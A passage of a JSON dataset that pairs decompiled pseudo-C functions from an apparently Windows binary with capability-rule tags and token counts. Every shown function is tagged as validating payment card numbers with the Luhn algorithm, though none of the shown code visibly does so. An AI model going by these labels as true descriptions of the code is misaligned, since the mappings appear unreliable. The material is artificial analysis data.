        "decompiled_code": "\nuint32_t fcn.000160e8(void)\n\n{\n    bool bVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    ulong unaff_RBX;\n    ulong unaff_RDI;\n    uchar *arg4;\n    ulong in_stack_00000000;\n    ulong arg_c0h;\n    ulong in_stack_00000010;\n    ulong noname_4;\n    ulong in_stack_ffffffffffffff80;\n    ulong in_stack_ffffffffffffff88;\n    ulong in_stack_ffffffffffffff90;\n    ulong in_stack_ffffffffffffff98;\n    ulong in_stack_ffffffffffffffa0;\n    ulong in_stack_ffffffffffffffa8;\n    ulong in_stack_ffffffffffffffb0;\n    ulong in_stack_ffffffffffffffb8;\n    ulong in_stack_ffffffffffffffc0;\n    ulong in_stack_ffffffffffffffc8;\n    ulong in_stack_ffffffffffffffd0;\n    ulong in_stack_ffffffffffffffd8;\n    ulong in_stack_ffffffffffffffe0;\n    ulong in_stack_ffffffffffffffe8;\n    \n    bVar1 = false;\n    arg_c0h = 0;\n    uVar2 = fcn.00049b64();\n    *0x78810 = fcn.0002fbf0(uVar2 * 0x170);\n    if (*0x78810 == 0) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        uVar2 = fcn.00049b64();\n        *0x78808 = fcn.0002fbf0(uVar2 << 6);\n        if (*0x78808 == 0) {\n            uVar2 = 0xc000009a;\n        }\n        else {\n            uVar2 = fcn.0001a650(&stack0xffffffffffffff88, fcn.0005cbfc, 0);\n            if (uVar2 == 0) {\n                fcn.00031648(&stack0xffffffffffffff88, 0);\n                fcn.00031624(&stack0xffffffffffffff88);\n                (*_fcn.00011600)(&stack0xffffffffffffff88, 0, 0);\n                (**0x11608)(&stack0xffffffffffffffa8, 0x160a0, &stack0xffffffffffffff88);\n                (**0x11610)(&stack0xffffffffffffffa8, 2);\n                (**0x11618)(&stack0xffffffffffffffa8, 0);\n                (**0x11620)(&stack0xffffffffffffffa8, 0, 0);\n                noname_4 = 0;\n                (*_fcn.00011628)(&stack0xffffffffffffff88, 0, 0, 0);\n                uVar2 = ~-(*0x787e0 != 0) & 0xc0000001;\n                if ((uVar2 == 0) && (uVar2 = fcn.0004afbc(*(*0x64080 + 0x10), 0x11678, 0x787d8),  uVar2 == 0)) {\n                    iVar3 = fcn.0004afbc(*(*0x64080 + 0x10), 0x11668, 0x787d0);\n                    if (iVar3 == 0) {\n                        *0x787c8 = **0x787d0;\n                    }\n                    arg4 = &stack0x00000008;\n                    uVar2 = fcn.0001a8b4(*0x115f8, 0x100, 0, arg4);\n                    if (uVar2 == 0) {\n                        bVar1 = true;\n                        uVar2 = fcn.0004afbc(*(*0x64080 + 0x10), 0x11650, &stack0x00000010);\n                        if ((uVar2 == 0) &&\n                           (uVar2 = fcn.00051f30(in_stack_00000010, 0x164b2, 0x787e8, arg4, noname_4, \n                                                 in_stack_ffffffffffffff80, in_stack_ffffffffffffff88, \n                                                 in_stack_ffffffffffffff90, in_stack_ffffffffffffff98, \n                                                 in_stack_ffffffffffffffa0, in_stack_ffffffffffffffa8, \n                                                 in_stack_ffffffffffffffb0, in_stack_ffffffffffffffb8, \n                                                 in_stack_ffffffffffffffc0, in_stack_ffffffffffffffc8, \n                                                 in_stack_ffffffffffffffd0, in_stack_ffffffffffffffd8, \n                                                 in_stack_ffffffffffffffe0, in_stack_ffffffffffffffe8, unaff_RDI, \n                                                 unaff_RBX, in_stack_00000000, arg_c0h, in_stack_00000010),  uVar2 == 0)\n                           ) {\n                            fcn.0005c47c(*0x787e8);\n                            *0x787f0 = fcn.0005164c(*0x787e8);\n                            uVar2 = fcn.00051f30(*0x787e0, 0x1655a, 0x787f8, arg4, noname_4, in_stack_ffffffffffffff80, \n                                                 in_stack_ffffffffffffff88, in_stack_ffffffffffffff90, \n                                                 in_stack_ffffffffffffff98, in_stack_ffffffffffffffa0, \n                                                 in_stack_ffffffffffffffa8, in_stack_ffffffffffffffb0, \n                                                 in_stack_ffffffffffffffb8, in_stack_ffffffffffffffc0, \n                                                 in_stack_ffffffffffffffc8, in_stack_ffffffffffffffd0, \n                                                 in_stack_ffffffffffffffd8, in_stack_ffffffffffffffe0, \n                                                 in_stack_ffffffffffffffe8, unaff_RDI, unaff_RBX, in_stack_00000000, \n                                                 arg_c0h, in_stack_00000010);\n                            if (uVar2 == 0) {\n                                fcn.0005c47c(*0x787f8);\n                                *0x78800 = fcn.0005164c(*0x787f8);\n                                return 0;\n                            }\n                        }\n                    }\n                }\n            }\n        }\n        fcn.0005c47c(*0x787e8);\n        fcn.00052250(0x787e8);\n        if (bVar1) {\n            fcn.0001a924(*0x115f8, arg_c0h);\n        }\n        fcn.0002fc50(*0x78808);\n        fcn.0002fc50(*0x78810);\n    }\n    return uVar2;\n}\n",
        "token_count": 1440
    },
    "00016774": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint64_t fcn.00016774(void)\n\n{\n    int64_t iVar1;\n    int64_t iVar2;\n    \n    iVar1 = fcn.00016090();\n    iVar1 = iVar1 * 0x170 + *0x78810;\n    iVar2 = *(iVar1 + 0x40) + -5;\n    *(iVar1 + 0x40) = iVar2;\n    iVar1 = fcn.00016090();\n    iVar1 = iVar1 * 0x170 + *0x78810;\n    **(iVar1 + 0x48) = *(iVar1 + 0x40);\n    return iVar2;\n}\n",
        "token_count": 144
    },
    "000167a8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.000167a8(uint64_t arg1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint64_t uVar4;\n    bool bVar5;\n    ulong auStackX16 [3];\n    uchar auStack264 [96];\n    uchar auStack168 [96];\n    uchar auStack72 [48];\n    \n    iVar1 = fcn.0002f718();\n    LOCK();\n    bVar5 = *0x78818 == 0;\n    *0x78818 = *0x78818 ^ bVar5 * (*0x78818 ^ 1);\n    if (!bVar5 * *0x78818 != 1) {\n        fcn.0001c9cc();\n        uVar4 = 0x79d10;\n        fcn.0002f598(0x79d10, 0x104);\n        fcn.0001f58c();\n        fcn.000387ac();\n        fcn.000380b0();\n        iVar2 = fcn.0002e6a4(uVar4 & 0xffffffffffffff00 | arg1 & 0xff);\n        if (iVar2 == 0) {\n            fcn.000619d2(*(*0x64080 + 0x28));\n        }\n        if (iVar1 < 0x1b) {\n            fcn.0004427c();\n        }\n        iVar2 = fcn.00045c38();\n        if (iVar2 == 0) {\n            fcn.00036cd4();\n            fcn.00042610();\n        }\n        *0x88d28 = *(*0x64080 + 4);\n        *0x88e60 = *0x64080;\n        *0x88e58 = 1;\n        *0x88e38 = 0x1cee8;\n        *0x88d30 = *0x11688;\n        *0x88d34 = *0x1168c;\n        fcn.000282e0(auStack264, 0x52);\n        fcn.00028330(auStack168, 0x52);\n        iVar2 = (-(arg1 != 0) & 0xffffff8b) + 0x78;\n        do {\n            iVar3 = fcn.00030924(auStack264, auStack72);\n            if (iVar3 == 0) {\n                iVar3 = fcn.00022fa0(auStack168, 0);\n                if (iVar3 == 0) break;\n            }\n            auStackX16[0] = 0xffffffffff676980;\n            (**0x115e0)(0, 0, auStackX16);\n            bVar5 = iVar2 != 0;\n            iVar2 = iVar2 + -1;\n        } while (bVar5);\n        if (0x1a < iVar1) {\n            fcn.0003e524();\n        }\n        fcn.000589d0();\n        fcn.0001dacc();\n        fcn.000499b8();\n        fcn.0001a114();\n        fcn.0001d3a0();\n        fcn.0003cf28();\n        fcn.0003f5e4();\n    }\n    return 0;\n}\n",
        "token_count": 724
    },
    "000169b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.000169b4(void)\n\n{\n    int32_t *piVar1;\n    ulong *noname_0;\n    bool bVar2;\n    int64_t arg1;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint64_t uVar6;\n    ulong arg1_00;\n    ulong *arg1_01;\n    int64_t *piVar7;\n    ulong uStackX8;\n    ulong uStackX16;\n    ulong uStackX24;\n    ulong uStackX32;\n    \n    iVar3 = fcn.0002f718();\n    fcn.0005c47c(*0x78820);\n    fcn.00052250(0x78820);\n    if (iVar3 < 0x1b) {\n        fcn.0004813c(*0x79c90);\n    }\n    fcn.0005c47c(*0x78848);\n    arg1 = *0x78848;\n    arg1_01 = 0x78848;\n    bVar2 = false;\n    uStackX16 = 0;\n    uStackX8 = 0;\n    uStackX32 = 0;\n    uStackX24 = 0;\n    if (*0x879c8 == 0) {\n        return 0x21590001;\n    }\n    if ((*0x78848 == 0) ||\n       ((((*(*0x78848 + 0xa8) != 0 && (*(*0x78848 + 0xa8) != 1)) || (*(*0x78848 + 0x10) == 0)) ||\n        ((*(*0x78848 + 0x28) == 0 || (*(*0x78848 + 0x20) == 0)))))) {\n        return 0x21590065;\n    }\n    if (*(*0x78848 + 0xac) == 2) {\n        arg1_01 = &uStackX32;\n        uVar6 = fcn.00051020(arg1_01, &uStackX24);\n    }\n    else {\n        uVar6 = 0;\n    }\n    if (uVar6 != 0) {\n        return uVar6;\n    }\n    if (*(arg1 + 0xb8) == 0) {\n        noname_0 = *(arg1 + 0x10);\n        *(arg1 + 0xc0) = 4;\n        *(arg1 + 0xb8) = noname_0;\n        uVar5 = *(arg1 + 0xc0);\n        arg1_01 = noname_0;\n        uVar4 = fcn.0001a8b4(noname_0, uVar5, 2, arg1 + 200);\n        *(arg1 + 0xb8) = noname_0;\n        *(arg1 + 0xc0) = uVar5;\n        uVar6 = uVar4;\n        if (uVar4 != 0) goto code_r0x00052435;\n    }\n    uVar5 = fcn.0001a764(CONCAT71(arg1_01 >> 8, 2), &uStackX16, &uStackX8);\n    uVar6 = uVar5;\n    if (uVar5 != 0) goto code_r0x00052435;\n    arg1_00 = fcn.0001a724();\n    uVar5 = 0;\n    if (*0x879c0 == 0) {\ncode_r0x000523f5:\n        uVar6 = 0x21590005;\n    }\n    else {\n        piVar7 = *0x879b8 + 8;\n        do {\n            if (*piVar7 == arg1) {\n                uVar6 = uVar5;\n                piVar1 = *(*0x879b8 + 8 + uVar6 * 0x10) + 0xd0;\n                *piVar1 = *piVar1 + -1;\n                if (*(*(*0x879b8 + 8 + uVar6 * 0x10) + 0xd0) != 0) {\n                    uVar6 = 0;\n                    goto code_r0x000523fa;\n                }\n                *(*0x879b8 + 8 + uVar6 * 0x10) = 0;\n                *(*0x879b8 + uVar6 * 0x10) = 0;\n                uVar5 = 0xffffffff;\n                break;\n            }\n            uVar5 = uVar5 + 1;\n            piVar7 = piVar7 + 2;\n        } while (uVar5 < *0x879c0);\n        if (uVar5 != 0xffffffff) goto code_r0x000523f5;\n        fcn.000514b4(arg1);\n        uVar6 = 0;\n        bVar2 = true;\n    }\ncode_r0x000523fa:\n    fcn.0001a734(arg1_00);\n    fcn.0001a878(uStackX16, uStackX8);\n    if ((uVar6 == 0) && (bVar2)) {\n        fcn.0001a924(*(arg1 + 0xb8), *(arg1 + 200));\n        fcn.00051454(0x78848);\n    }\ncode_r0x00052435:\n    fcn.00051900(uStackX32, uStackX24);\n    return uVar6;\n}\n",
        "token_count": 1214
    },
    "00016b78": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00016b78(ulong arg1)\n\n{\n    int32_t iVar1;\n    uint64_t noname_12;\n    uint64_t noname_14;\n    char in_DL;\n    ulong unaff_RSI;\n    ulong unaff_RDI;\n    ulong in_R9;\n    uint auStackX24 [2];\n    ulong uStackX32;\n    uint *in_stack_ffffffffffffff58;\n    uint in_stack_ffffffffffffff60;\n    uint in_stack_ffffffffffffff64;\n    ulong in_stack_ffffffffffffff68;\n    ushort uVar2;\n    ushort uVar3;\n    uint in_stack_ffffffffffffff74;\n    ulong noname_8;\n    ushort uVar4;\n    ushort uVar5;\n    uint in_stack_ffffffffffffff84;\n    ulong noname_10;\n    ulong noname_11;\n    ulong noname_13;\n    uint uVar6;\n    uint in_stack_ffffffffffffffb4;\n    ulong noname_16;\n    uchar *noname_17;\n    uint uVar7;\n    uint in_stack_ffffffffffffffcc;\n    ulong noname_19;\n    ulong arg_b0h;\n    ulong in_stack_ffffffffffffffe0;\n    \n    uVar2 = 0xa8;\n    uVar3 = 0xaa;\n    noname_8 = 0x11730;\n    uVar4 = 0x20;\n    uVar5 = 0x22;\n    noname_10 = 0x11700;\n    auStackX24[0] = 0xffffffff;\n    iVar1 = fcn.0001ae70();\n    if (iVar1 == 0) {\n        noname_11 = *(*0x64080 + 4);\n        noname_12 = *(*0x64080 + 0xc);\n        noname_13 = *(*0x64080 + 0x10);\n        noname_14 = *(*0x64080 + 0x18);\n        iVar1 = fcn.00052a94(&stack0xffffffffffffff90);\n        if (iVar1 == 0) {\n            fcn.0001c904();\n            if (in_DL != '\\0') {\n                fcn.00017230(arg1);\n            }\n            iVar1 = fcn.000160e8();\n            if (iVar1 == 0) {\n                noname_17 = &stack0xffffffffffffff70;\n                uVar6 = 0x30;\n                noname_16 = 0;\n                uVar7 = 0x40;\n                noname_19 = 0;\n                arg_b0h = 0;\n                iVar1 = fcn.000619ea(&uStackX32, 2, &stack0xffffffffffffffb0);\n                if (iVar1 == 0) {\n                    in_R9 = 4;\n                    in_stack_ffffffffffffff58 = auStackX24;\n                    in_stack_ffffffffffffff60 = 4;\n                    fcn.000619e4(uStackX32, &stack0xffffffffffffff80, 0);\n                    fcn.000619de(uStackX32);\n                }\n                iVar1 = fcn.00017104();\n                if (((iVar1 == 0) &&\n                    (iVar1 = fcn.0004afbc(*(*0x64080 + 0x10), 0x116f0, &stack0xffffffffffffff68),  iVar1 == 0)) &&\n                   (iVar1 = fcn.00051f30(in_stack_ffffffffffffff68, 0x169f4, 0x78820, in_R9, in_stack_ffffffffffffff58, \n                                         CONCAT44(in_stack_ffffffffffffff64, in_stack_ffffffffffffff60), \n                                         in_stack_ffffffffffffff68, \n                                         CONCAT44(in_stack_ffffffffffffff74, CONCAT22(uVar3, uVar2)), noname_8, \n                                         CONCAT44(in_stack_ffffffffffffff84, CONCAT22(uVar5, uVar4)), noname_10, \n                                         noname_11, noname_12, noname_13, noname_14, \n                                         CONCAT44(in_stack_ffffffffffffffb4, uVar6), noname_16, noname_17, \n                                         CONCAT44(in_stack_ffffffffffffffcc, uVar7), noname_19, arg_b0h, \n                                         in_stack_ffffffffffffffe0, unaff_RDI, unaff_RSI),  iVar1 == 0)) {\n                    fcn.0005c47c(*0x78820);\n                    return 0;\n                }\n            }\n        }\n    }\n    fcn.000169b4();\n    return iVar1;\n}\n",
        "token_count": 1004
    },
    "00016d54": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00016d54(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ulong *puVar1;\n    ulong uVar2;\n    uchar auStackX32 [8];\n    \n    puVar1 = fcn.0002fbf0(0x20);\n    if (puVar1 == NULL) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        puVar1[3] = arg3;\n        puVar1[1] = arg1;\n        puVar1[2] = arg2;\n        fcn.00031564(0x78828, auStackX32, 1);\n        *puVar1 = *0x78840;\n        *0x78840 = puVar1;\n        fcn.00031598(0x78828, auStackX32, 1);\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 206
    },
    "00016e44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00016e44(ulong arg1, ulong *arg2)\n\n{\n    int32_t iVar1;\n    ulong auStackX24 [2];\n    uchar auStack40 [24];\n    \n    fcn.000619f0(auStack40, arg1);\n    iVar1 = (*_fcn.000115a0)(auStack40, 0, auStackX24, arg2);\n    if (iVar1 == 0) {\n        (*_fcn.000115a8)(*arg2);\n        (*_fcn.000115b0)(auStackX24[0]);\n    }\n    return iVar1;\n}\n",
        "token_count": 139
    },
    "00017104": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00017104(void)\n\n{\n    int32_t iVar1;\n    ulong unaff_RBX;\n    ulong in_R9;\n    ulong in_stack_00000000;\n    ulong in_stack_00000008;\n    ulong in_stack_00000010;\n    ulong in_stack_00000018;\n    ulong in_stack_00000020;\n    ulong in_stack_00000028;\n    ulong in_stack_00000030;\n    ulong in_stack_00000038;\n    ulong in_stack_00000040;\n    ulong in_stack_00000048;\n    ulong in_stack_00000050;\n    ulong in_stack_00000058;\n    ulong in_stack_00000060;\n    ulong in_stack_00000068;\n    ulong in_stack_00000070;\n    ulong in_stack_00000078;\n    ulong in_stack_00000080;\n    ulong in_stack_00000088;\n    ulong in_stack_00000090;\n    \n    fcn.000313e0(0x78828);\n    iVar1 = fcn.0004afbc(*(*0x64080 + 0x10), 0x117e0, &stack0x00000008);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00051f30(in_stack_00000008, 0x16fac, 0x78848, in_R9, unaff_RBX, in_stack_00000000, in_stack_00000008\n                             , in_stack_00000010, in_stack_00000018, in_stack_00000020, in_stack_00000028, \n                             in_stack_00000030, in_stack_00000038, in_stack_00000040, in_stack_00000048, \n                             in_stack_00000050, in_stack_00000058, in_stack_00000060, in_stack_00000068, \n                             in_stack_00000070, in_stack_00000078, in_stack_00000080, in_stack_00000088, \n                             in_stack_00000090);\n        if (iVar1 == 0) {\n            fcn.0005c47c(*0x78848);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 484
    },
    "0001716c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.0001716c(ulong arg1, int64_t arg2, int64_t arg3, ulong arg4)\n\n{\n    uchar *puVar1;\n    ulong uVar2;\n    ulong *puVar3;\n    \n    puVar1 = *(arg2 + 0xb8);\n    if (arg3 != 0) {\n        puVar3 = fcn.0002fbf0(0x58);\n        if (puVar3 == NULL) {\n            *(arg2 + 0x30) = 0xc000009a;\n            (**0x11588)(arg2, 0);\n            return 0xc000009a;\n        }\n        *puVar3 = *(puVar1 + 0x38);\n        uVar2 = *(puVar1 + 0x40);\n        puVar3[2] = arg3;\n        puVar3[3] = arg4;\n        puVar3[1] = uVar2;\n        uVar2 = *(puVar1 + 0x30);\n        puVar3[5] = arg1;\n        puVar3[4] = uVar2;\n        *(puVar3 + 6) = puVar1[3];\n        *(puVar3 + 0x32) = *puVar1;\n        *(puVar3 + 0x33) = puVar1[1];\n        *(puVar3 + 0x31) = puVar1[2];\n        fcn.000619f6(puVar3 + 0x34, puVar1 + 8, 0x20);\n        *(puVar1 + 0x38) = 0x16e94;\n        *(puVar1 + 0x40) = puVar3;\n        puVar1[3] = 0xe0;\n    }\n    return 0;\n}\n",
        "token_count": 404
    },
    "00017230": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00017230(int16_t *arg1)\n\n{\n    int16_t iVar1;\n    uint64_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int64_t iVar5;\n    int16_t *piVar6;\n    ulong auStackX24 [2];\n    ulong in_stack_fffffffffffff830;\n    uint uVar9;\n    ulong uVar7;\n    ulong uVar8;\n    ulong in_stack_fffffffffffff838;\n    uint32_t uVar11;\n    uint64_t uVar10;\n    ulong in_stack_fffffffffffff840;\n    uint uVar12;\n    ulong in_stack_fffffffffffff848;\n    uint uVar14;\n    ulong uVar13;\n    uint auStack1944 [2];\n    ulong uStack1936;\n    uchar *puStack1928;\n    uint uStack1920;\n    ulong uStack1912;\n    ulong uStack1904;\n    uchar auStack1896 [16];\n    ushort uStack1880;\n    ushort uStack1878;\n    ulong uStack1872;\n    ushort uStack1864;\n    ushort uStack1862;\n    ulong uStack1856;\n    ushort uStack1848;\n    ushort uStack1846;\n    ulong uStack1840;\n    ushort uStack1832;\n    ushort uStack1830;\n    ulong uStack1824;\n    ushort uStack1816;\n    ushort uStack1814;\n    ulong uStack1808;\n    ushort uStack1800;\n    ushort uStack1798;\n    ulong uStack1792;\n    ushort uStack1784;\n    ushort uStack1782;\n    ulong uStack1776;\n    uchar auStack1768 [16];\n    ulong uStack1752;\n    uint64_t uStack1744;\n    uchar auStack1736 [112];\n    int16_t aiStack1624 [259];\n    ushort uStack1106;\n    uchar auStack1096 [518];\n    ushort uStack578;\n    int16_t aiStack568 [259];\n    ushort uStack50;\n    \n    uVar9 = in_stack_fffffffffffff830 >> 0x20;\n    uVar11 = in_stack_fffffffffffff838 >> 0x20;\n    uVar12 = in_stack_fffffffffffff840 >> 0x20;\n    uVar14 = in_stack_fffffffffffff848 >> 0x20;\n    uStack1832 = 8;\n    uStack1830 = 10;\n    uStack1824 = 0x11950;\n    uStack1784 = 10;\n    uStack1782 = 0xc;\n    uStack1776 = 72000;\n    uStack1816 = 0x18;\n    uStack1814 = 0x1a;\n    uStack1808 = 0x11920;\n    uStack1800 = 10;\n    uStack1798 = 0xc;\n    uStack1792 = 0x11910;\n    uStack1880 = 0x12;\n    uStack1878 = 0x14;\n    uStack1872 = 0x118f8;\n    uStack1848 = 0x14;\n    uStack1846 = 0x16;\n    uStack1840 = 0x118e0;\n    uStack1864 = 10;\n    uStack1862 = 0xc;\n    uStack1856 = 0x118d0;\n    fcn.000289a0(auStack1736, 100);\n    fcn.00061a0e(auStack1096, 0x104, 0x118b0, auStack1736);\n    uStack578 = 0;\n    fcn.000289f0(auStack1736, 100);\n    fcn.00061a0e(aiStack568, 0x104, 0x118a0, auStack1096, auStack1736);\n    uStack50 = 0;\n    fcn.000619f0(auStack1896, auStack1096);\n    auStack1944[0] = 0x30;\n    uStack1936 = 0;\n    uStack1920 = 0x40;\n    puStack1928 = auStack1896;\n    uStack1912 = 0;\n    uStack1904 = 0;\n    uVar13 = CONCAT44(uVar14, 0x21);\n    uVar8 = CONCAT44(uVar12, 2);\n    uVar10 = uVar11 << 0x20;\n    uVar7 = CONCAT44(uVar9, 2);\n    iVar3 = fcn.0001dda0(auStackX24, 0xc0000000, auStack1944, auStack1768, 0, uVar7, uVar10, uVar8, uVar13, 0, 0);\n    uVar9 = uVar7 >> 0x20;\n    uVar12 = uVar8 >> 0x20;\n    uVar14 = uVar13 >> 0x20;\n    if (iVar3 == 0) {\n        fcn.000619de(auStackX24[0]);\n    }\n    if ((*arg1 == 0) && (*(arg1 + 0x14) != 0)) {\n        (**0x11568)(*(arg1 + 0x14), 0x10, 1);\n        uVar7 = **(arg1 + 0x14);\n        uVar2 = (*(arg1 + 0x14))[1];\n        uStack1752 = uVar7;\n        uStack1744 = uVar2;\n        (**0x11568)(uVar7, uVar7, uVar2 & 0xffffffff, 1);\n        fcn.000619f0(auStack1896, aiStack568);\n        auStack1944[0] = 0x30;\n        uStack1936 = 0;\n        uStack1920 = 0x40;\n        puStack1928 = auStack1896;\n        uStack1912 = 0;\n        uStack1904 = 0;\n        uVar10 = uVar10 & 0xffffffff00000000;\n        uVar8 = CONCAT44(uVar9, 0x80);\n        iVar3 = fcn.0001dda0(auStackX24, 0x40000000, auStack1944, auStack1768, 0, uVar8, uVar10, CONCAT44(uVar12, 2), \n                             CONCAT44(uVar14, 0x60), 0, 0);\n        uVar9 = uVar8 >> 0x20;\n        if (iVar3 == 0) {\n            fcn.00061a08(auStackX24[0], 0, 0, 0, auStack1768, uVar7, uVar10 & 0xffffffff00000000 | uVar2 & 0xffffffff, 0\n                         , 0);\n            uVar9 = uVar7 >> 0x20;\n            fcn.000619de(auStackX24[0]);\n        }\n    }\n    iVar3 = fcn.0002f718();\n    fcn.000288a0(auStack1736, 100);\n    fcn.00061a0e(aiStack1624, 0x104, 0x11830);\n    fcn.000619f0(auStack1896, aiStack1624);\n    auStack1944[0] = 0x30;\n    uStack1936 = 0;\n    uStack1920 = 0x40;\n    puStack1928 = auStack1896;\n    uStack1912 = 0;\n    uStack1904 = 0;\n    iVar4 = fcn.0001c710(auStackX24, 0x40000000, auStack1944, 0);\n    if (iVar4 == 0) {\n        fcn.0001c7bc(auStackX24[0], &uStack1816, 0, 4);\n        fcn.0001c7bc(auStackX24[0], &uStack1832, 0, 4);\n        uVar7 = CONCAT44(uVar9, 4);\n        fcn.0001c7bc(auStackX24[0], &uStack1784, 0, 4);\n        if (0x25 < iVar3) {\n            fcn.00028a40(auStack1736, 100);\n            fcn.00061a0e(aiStack1624, 0x104, 0x118a0, auStack1096, auStack1736, uVar7);\n            uStack1106 = 0;\n            iVar5 = -1;\n            piVar6 = aiStack1624;\n            do {\n                if (iVar5 == 0) break;\n                iVar5 = iVar5 + -1;\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            fcn.0001c7bc(auStackX24[0], &uStack1880, 0, 2);\n        }\n        else {\n            fcn.0001c7bc(auStackX24[0], &uStack1800, 0, 1);\n            iVar5 = -1;\n            piVar6 = aiStack568;\n            do {\n                if (iVar5 == 0) break;\n                iVar5 = iVar5 + -1;\n                iVar1 = *piVar6;\n                piVar6 = piVar6 + 1;\n            } while (iVar1 != 0);\n            fcn.0001c7bc(auStackX24[0], &uStack1880, 0, 1);\n        }\n        if (0x25 < iVar3) {\n            fcn.0001c7bc(auStackX24[0], &uStack1848, 0, 1);\n            fcn.0001c7bc(auStackX24[0], &uStack1864, 0, 4);\n        }\n        fcn.00061a02(auStackX24[0]);\n        fcn.000619de(auStackX24[0]);\n    }\n    return;\n}\n",
        "token_count": 2261
    },
    "000178a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.000178a4(char param_1)\n\n{\n    int32_t iVar1;\n    uchar auStackX16 [8];\n    ulong uStackX24;\n    ulong uStackX32;\n    uint auStack792 [2];\n    ulong uStack784;\n    ushort *puStack776;\n    uint uStack768;\n    ulong uStack760;\n    ulong uStack752;\n    uchar auStack744 [16];\n    ushort uStack728;\n    ushort uStack726;\n    ulong uStack720;\n    ushort uStack712;\n    ushort uStack710;\n    ulong uStack704;\n    uchar auStack696 [16];\n    uchar auStack680 [112];\n    uchar auStack568 [528];\n    \n    uStack720 = 0x119e0;\n    uStack728 = 8;\n    uStack726 = 10;\n    uStack712 = 0x68;\n    uStack704 = 0x11970;\n    uStack710 = 0x6a;\n    fcn.000289a0(auStack680, 100);\n    fcn.00061a0e(auStack568, 0x104, 0x118b0, auStack680);\n    fcn.000619f0(auStack744, auStack568);\n    puStack776 = auStack744;\n    uStack768 = 0x40;\n    auStack792[0] = 0x30;\n    uStack784 = 0;\n    uStack760 = 0;\n    uStack752 = 0;\n    iVar1 = fcn.00061a26(&uStackX24, 0x10000000, auStack792, auStack696, 0, 0);\n    if (iVar1 == 0) {\n        if (param_1 != '\\0') {\n            fcn.00028950(auStack680, 100);\n            fcn.00061a0e(auStack568, 0x104, 0x1195c, auStack680);\n            fcn.000619f0(auStack744, auStack568);\n            uStack784 = uStackX24;\n            puStack776 = auStack744;\n            auStack792[0] = 0x30;\n            uStack768 = 0x40;\n            uStack760 = 0;\n            uStack752 = 0;\n            fcn.00061a20(auStack792);\n        }\n        fcn.000289f0(auStack680, 100);\n        fcn.00061a0e(auStack568, 0x104, 0x1195c, auStack680);\n        fcn.000619f0(auStack744, auStack568);\n        uStack784 = uStackX24;\n        puStack776 = auStack744;\n        auStack792[0] = 0x30;\n        uStack768 = 0x40;\n        uStack760 = 0;\n        uStack752 = 0;\n        fcn.00061a20(auStack792);\n        if (param_1 != '\\0') {\n            auStackX16[0] = 1;\n            fcn.00061a1a(uStackX24, auStack696, auStackX16, 1, 0xd);\n        }\n        fcn.000619de(uStackX24);\n    }\n    fcn.000288a0(auStack680, 100);\n    fcn.00061a0e(auStack568, 0x104, 0x11830, auStack680);\n    fcn.000619f0(auStack744, auStack568);\n    puStack776 = auStack744;\n    auStack792[0] = 0x30;\n    uStack784 = 0;\n    uStack768 = 0x40;\n    uStack760 = 0;\n    uStack752 = 0;\n    iVar1 = fcn.000619ea(&uStackX24, 0x10000000, auStack792);\n    if (iVar1 == 0) {\n        uStack784 = uStackX24;\n        puStack776 = &uStack728;\n        auStack792[0] = 0x30;\n        uStack768 = 0x40;\n        uStack760 = 0;\n        uStack752 = 0;\n        iVar1 = fcn.000619ea(&uStackX32, 0x10000000, auStack792);\n        if (iVar1 == 0) {\n            fcn.00061a14(uStackX32);\n            fcn.000619de(uStackX32);\n        }\n        fcn.00061a14(uStackX24);\n        fcn.000619de(uStackX24);\n    }\n    puStack776 = &uStack712;\n    auStack792[0] = 0x30;\n    uStack784 = 0;\n    uStack768 = 0x40;\n    uStack760 = 0;\n    uStack752 = 0;\n    iVar1 = fcn.000619ea(&uStackX24, 0x10000000, auStack792);\n    if (iVar1 == 0) {\n        fcn.00061a02(uStackX24);\n        fcn.000619de(uStackX24);\n    }\n    return;\n}\n",
        "token_count": 1159
    },
    "00018720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
